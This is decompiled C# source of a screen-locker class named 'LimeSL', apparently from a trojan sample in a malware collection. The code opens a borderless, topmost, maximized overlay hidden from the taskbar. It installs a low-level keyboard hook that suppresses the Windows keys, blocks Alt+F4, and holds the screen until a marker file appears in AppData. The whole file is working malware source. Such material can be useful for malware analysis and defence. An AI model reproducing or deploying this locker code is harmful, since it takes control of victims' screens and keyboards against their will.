// Decompiled with JetBrains decompiler
// Type: LimeSL
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[DesignerGenerated]
internal class LimeSL : Form
{
  private IContainer components;
  private const long KEYEVENTF_EXTENDEDKEY = 1;
  private const long KEYEVENTF_KEYUP = 2;
  private const byte VK_LWIN = 91;
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYUP = 257;
  private static LimeSL.LowLevelKeyboardProc _proc = new LimeSL.LowLevelKeyboardProc(LimeSL.HookCallback);
  private static IntPtr _hookID = IntPtr.Zero;

  public LimeSL()
  {
    this.Load += new EventHandler(this.Form1_Load);
    this.KeyDown += new KeyEventHandler(this.Form1_KeyDown);
    this.FormClosed += new FormClosedEventHandler(this.Form1_FormClosed);
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(9f, 20f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.Lime;
    this.ClientSize = new Size(278, 244);
    this.FormBorderStyle = FormBorderStyle.None;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (LimeSL);
    this.Opacity = 0.5;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.Text = nameof (LimeSL);
    this.TopMost = true;
    this.WindowState = FormWindowState.Maximized;
    this.ResumeLayout(false);
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr SetWindowsHookEx(
    int idHook,
    LimeSL.LowLevelKeyboardProc lpfn,
    IntPtr hMod,
    uint dwThreadId);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr UnhookWindowsHookEx(IntPtr hhk);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr CallNextHookEx(
    IntPtr hhk,
    int nCode,
    IntPtr wParam,
    IntPtr lParam);

  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

  private static IntPtr SetHook(LimeSL.LowLevelKeyboardProc proc)
  {
    ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
    LimeSL.LowLevelKeyboardProc lpfn = proc;
    string moduleName = mainModule.ModuleName;
    IntPtr moduleHandle = LimeSL.GetModuleHandle(ref moduleName);
    return LimeSL.SetWindowsHookEx(13, lpfn, moduleHandle, 0U);
  }

  public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
  {
    if (nCode >= 0 & wParam == (IntPtr) 257)
    {
      Keys keys = (Keys) Marshal.ReadInt32(lParam);
      if (keys == Keys.LWin | keys == Keys.RWin)
      {
        try
        {
          LimeSL.keybd_event((byte) 251, (byte) 0, 1L, 0L);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    return LimeSL.CallNextHookEx(LimeSL._hookID, nCode, wParam, lParam);
  }

  private void Form1_Load(object sender, EventArgs e)
  {
    LimeSL._hookID = LimeSL.SetHook(LimeSL._proc);
    while (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat"))
      Application.DoEvents();
    this.Close();
  }

  private void Form1_KeyDown(object sender, KeyEventArgs e)
  {
    if (!e.Alt || e.KeyCode != Keys.F4)
      return;
    e.Handled = true;
  }

  private void Form1_FormClosed(object sender, FormClosedEventArgs e) => LimeSL.UnhookWindowsHookEx(LimeSL._hookID);

  public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
}
